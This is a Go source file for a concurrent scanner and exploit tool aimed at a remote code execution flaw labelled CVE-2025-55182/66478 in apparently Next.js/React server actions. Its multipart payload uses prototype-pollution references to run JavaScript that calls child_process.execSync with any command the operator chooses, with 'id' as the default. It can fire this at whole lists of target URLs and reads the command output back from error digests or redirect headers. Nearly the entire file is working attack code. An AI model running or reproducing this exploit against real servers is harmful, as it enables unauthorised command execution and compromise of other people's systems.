package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	defaultCommand     = "id"
	defaultTimeout     = 10 * time.Second
	defaultConcurrency = 10

	headerContentType = "Content-Type"
	headerNextAction  = "Next-Action"
	headerRedirect    = "X-Action-Redirect"
	nextActionHeader  = "x"

	validationMarker = "CVE_2025_55182_66478_VERIFIED"
	probeCommand     = "echo " + validationMarker
)

type Config struct {
	URL         string
	Command     string
	Timeout     time.Duration
	Verbose     bool
	CheckOnly   bool
	Concurrency int
	TargetFile  string
	ConfirmRCE  bool
}

type Payload struct {
	Then     string          `json:"then"`
	Status   string          `json:"status"`
	Reason   int             `json:"reason"`
	Value    string          `json:"value"`
	Response ResponsePayload `json:"_response"`
}

type ResponsePayload struct {
	Prefix   string            `json:"_prefix"`
	FormData map[string]string `json:"_formData"`
}

type ScanResult struct {
	URL           string
	StatusCode    int
	Vulnerable    bool
	RCEConfirmed  bool
	Error         error
	ResponseBody  string
	ExecutionTime time.Duration
}

type Scanner struct {
	cfg    *Config
	client *http.Client
	logger *log.Logger
}

func NewScanner(cfg *Config) *Scanner {
	client := &http.Client{
		Timeout: cfg.Timeout,
		Transport: &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 10,
			IdleConnTimeout:     90 * time.Second,
		},
	}

	return &Scanner{
		cfg:    cfg,
		client: client,
		logger: log.New(os.Stdout, "[SCANNER] ", log.LstdFlags),
	}
}

func parseConfig() (*Config, error) {
	cfg := &Config{}
	var timeout time.Duration
	var concurrency int

	flag.StringVar(&cfg.URL, "url", "", "Single target URL")
	flag.StringVar(&cfg.TargetFile, "file", "", "File containing list of URLs (one per line)")
	flag.StringVar(&cfg.Command, "c", defaultCommand, "Command to execute")
	flag.DurationVar(&timeout, "t", defaultTimeout, "Request timeout (e.g. 5s, 1m)")
	flag.BoolVar(&cfg.Verbose, "v", false, "Verbose output")
	flag.BoolVar(&cfg.CheckOnly, "check-only", false, "Only check vulnerability without exploiting")
	flag.BoolVar(&cfg.ConfirmRCE, "confirm-rce", false, "Confirm RCE by checking redirect header")
	flag.IntVar(&concurrency, "threads", defaultConcurrency, "Number of concurrent workers")
	flag.Parse()

	cfg.Timeout = timeout
	cfg.Concurrency = concurrency

	if cfg.URL == "" && cfg.TargetFile == "" {
		return nil, fmt.Errorf("either -url or -file must be provided")
	}

	return cfg, nil
}

func (s *Scanner) buildPayload(command string) Payload {
	var jsCode string

	if s.cfg.ConfirmRCE {
		jsCode = fmt.Sprintf(
			`const cp = process.mainModule.require('child_process');`+
				`const output = cp.execSync('%s', { timeout: 5000 }).toString().trim();`+
				`const err = new Error('NEXT_REDIRECT');`+
				`err.digest = 'NEXT_REDIRECT;push;/callback?result=' + output + ';307;';`+
				`throw err;`,
			command,
		)
	} else {
		jsCode = fmt.Sprintf(
			`const cp = process.mainModule.require('child_process');`+
				`const result = cp.execSync('%s', { timeout: 5000 }).toString().trim();`+
				`const err = new Error('NEXT_REDIRECT');`+
				`err.digest = result;`+
				`throw err;`,
			command,
		)
	}

	return Payload{
		Then:   "$1:__proto__:then",
		Status: "resolved_model",
		Reason: -1,
		Value:  `{"then": "$B0"}`,
		Response: ResponsePayload{
			Prefix: jsCode,
			FormData: map[string]string{
				"get": "$1:constructor:constructor",
			},
		},
	}
}

func (s *Scanner) createMultipartBody(payload Payload) ([]byte, string, error) {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		return nil, "", fmt.Errorf("marshal payload: %w", err)
	}

	if err := writer.WriteField("0", string(payloadJSON)); err != nil {
		return nil, "", fmt.Errorf("write field 0: %w", err)
	}
	if err := writer.WriteField("1", `"$@0"`); err != nil {
		return nil, "", fmt.Errorf("write field 1: %w", err)
	}
	if err := writer.WriteField("2", "[]"); err != nil {
		return nil, "", fmt.Errorf("write field 2: %w", err)
	}

	contentType := writer.FormDataContentType()
	if err := writer.Close(); err != nil {
		return nil, "", fmt.Errorf("close multipart writer: %w", err)
	}

	return body.Bytes(), contentType, nil
}

func (s *Scanner) sendRequest(ctx context.Context, url string, body []byte, contentType string) (*http.Response, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}

	req.Header.Set(headerContentType, contentType)
	req.Header.Set(headerNextAction, nextActionHeader)

	resp, err := s.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("do request: %w", err)
	}

	return resp, nil
}

func (s *Scanner) checkVulnerability(resp *http.Response, body string) bool {
	if s.cfg.ConfirmRCE {
		redirectHeader := resp.Header.Get(headerRedirect)
		m := fmt.Sprintf("%s%s", "/callback?result=", validationMarker)
		return redirectHeader != "" && strings.Contains(redirectHeader, m)
	}

	if resp.StatusCode != http.StatusInternalServerError {
		return false
	}

	return strings.Contains(body, `E{"digest"`) || strings.Contains(body, `"digest"`)
}

func (s *Scanner) checkRCE(resp *http.Response, expectedOutput string) bool {
	redirectHeader := resp.Header.Get(headerRedirect)
	if redirectHeader == "" {
		return false
	}

	pattern := fmt.Sprintf(`.*/callback\?result=%s.*`, regexp.QuoteMeta(expectedOutput))
	matched, _ := regexp.MatchString(pattern, redirectHeader)
	return matched
}

func (s *Scanner) scanURL(ctx context.Context, url string) *ScanResult {
	start := time.Now()

	result := &ScanResult{
		URL: url,
	}

	command := s.cfg.Command
	expectedOutput := ""

	switch {
	case s.cfg.CheckOnly:
		command = probeCommand
		expectedOutput = validationMarker
	case s.cfg.ConfirmRCE:
		command = probeCommand
		expectedOutput = validationMarker
	}

	payload := s.buildPayload(command)

	body, contentType, err := s.createMultipartBody(payload)
	if err != nil {
		result.Error = err
		result.ExecutionTime = time.Since(start)
		return result
	}

	resp, err := s.sendRequest(ctx, url, body, contentType)
	if err != nil {
		result.Error = err
		result.ExecutionTime = time.Since(start)
		return result
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		result.Error = fmt.Errorf("read response body: %w", err)
		result.ExecutionTime = time.Since(start)
		return result
	}

	result.StatusCode = resp.StatusCode
	result.ResponseBody = string(respBody)
	result.Vulnerable = s.checkVulnerability(resp, result.ResponseBody)

	if s.cfg.ConfirmRCE && result.Vulnerable {
		result.RCEConfirmed = s.checkRCE(resp, expectedOutput)
	}

	result.ExecutionTime = time.Since(start)

	return result
}

func (s *Scanner) printResult(result *ScanResult) {
	if result.Error != nil {
		s.logger.Printf("[ERROR] %s - %v (%.2fs)", result.URL, result.Error, result.ExecutionTime.Seconds())
		return
	}

	status := "NOT VULNERABLE"
	if result.Vulnerable {
		if s.cfg.ConfirmRCE {
			if result.RCEConfirmed {
				status = "VULNERABLE + RCE CONFIRMED"
			} else {
				status = "VULNERABLE (RCE NOT CONFIRMED)"
			}
		} else {
			status = "VULNERABLE"
		}
	}

	s.logger.Printf("[%s] %s - Status: %d (%.2fs)",
		status, result.URL, result.StatusCode, result.ExecutionTime.Seconds())

	if !s.cfg.Verbose {
		return
	}

	fmt.Printf("\n--- Details for %s ---\n", result.URL)
	fmt.Printf("Status Code: %d\n", result.StatusCode)
	fmt.Printf("Vulnerable: %v\n", result.Vulnerable)
	if s.cfg.ConfirmRCE {
		fmt.Printf("RCE Confirmed: %v\n", result.RCEConfirmed)
	}
	fmt.Printf("Execution Time: %.2fs\n", result.ExecutionTime.Seconds())
	fmt.Println("Response Body (first 2000 chars):")
	if len(result.ResponseBody) > 2000 {
		fmt.Print(result.ResponseBody[:2000])
	} else {
		fmt.Print(result.ResponseBody)
	}
	fmt.Print("\n--- End Details ---\n")
}

func loadURLsFromFile(filename string) ([]string, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("open file: %w", err)
	}
	defer f.Close()

	var urls []string
	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		urls = append(urls, line)
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("read file: %w", err)
	}

	return urls, nil
}

func (s *Scanner) runScanner(ctx context.Context, urls []string) []*ScanResult {
	urlCh := make(chan string)
	resultCh := make(chan *ScanResult)

	var wg sync.WaitGroup

	workerCount := max(s.cfg.Concurrency, 1)

	for range workerCount {
		wg.Go(func() {

			for url := range urlCh {
				select {
				case <-ctx.Done():
					return
				default:
				}

				result := s.scanURL(ctx, url)
				resultCh <- result
			}
		})
	}

	go func() {
		for _, url := range urls {
			select {
			case <-ctx.Done():
				return
			case urlCh <- url:
			}
		}
		close(urlCh)
	}()

	go func() {
		wg.Wait()
		close(resultCh)
	}()

	var results []*ScanResult
	for result := range resultCh {
		s.printResult(result)
		results = append(results, result)
	}

	return results
}

func (s *Scanner) printSummary(results []*ScanResult) {
	total := len(results)
	var (
		vulnerable   int
		rceConfirmed int
		errCount     int
	)

	for _, result := range results {
		switch {
		case result.Error != nil:
			errCount++
		case result.Vulnerable:
			vulnerable++
			if result.RCEConfirmed {
				rceConfirmed++
			}
		}
	}

	secure := total - vulnerable - errCount

	if s.cfg.ConfirmRCE {
		fmt.Printf(
			"\nScanned %d targets: %d vulnerable, %d RCE confirmed, %d secure, %d errors\n",
			total, vulnerable, rceConfirmed, secure, errCount,
		)
	} else {
		fmt.Printf(
			"\nScanned %d targets: %d vulnerable, %d secure, %d errors\n",
			total, vulnerable, secure, errCount,
		)
	}

	if vulnerable == 0 {
		return
	}

	fmt.Println("\nVulnerable targets:")
	for _, result := range results {
		if !result.Vulnerable {
			continue
		}

		switch {
		case s.cfg.ConfirmRCE && result.RCEConfirmed:
			fmt.Printf("  - %s [RCE CONFIRMED]\n", result.URL)
		case s.cfg.ConfirmRCE:
			fmt.Printf("  - %s [RCE NOT CONFIRMED]\n", result.URL)
		default:
			fmt.Printf("  - %s\n", result.URL)
		}
	}
}

func buildTargetList(cfg *Config, logger *log.Logger) []string {
	var urls []string

	if cfg.URL != "" {
		urls = append(urls, cfg.URL)
	}

	if cfg.TargetFile != "" {
		fileURLs, err := loadURLsFromFile(cfg.TargetFile)
		if err != nil {
			logger.Fatalf("failed to load URLs from file: %v", err)
		}
		urls = append(urls, fileURLs...)
	}

	if len(urls) == 0 {
		logger.Fatal("no URLs to scan")
	}

	logger.Printf("Loaded %d URLs", len(urls))

	return urls
}

func main() {
	cfg, err := parseConfig()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		flag.Usage()
		os.Exit(1)
	}

	scanner := NewScanner(cfg)
	urls := buildTargetList(cfg, scanner.logger)

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	results := scanner.runScanner(ctx, urls)
	scanner.printSummary(results)

	for _, result := range results {
		if result.Vulnerable {
			os.Exit(0)
		}
	}

	os.Exit(1)
}
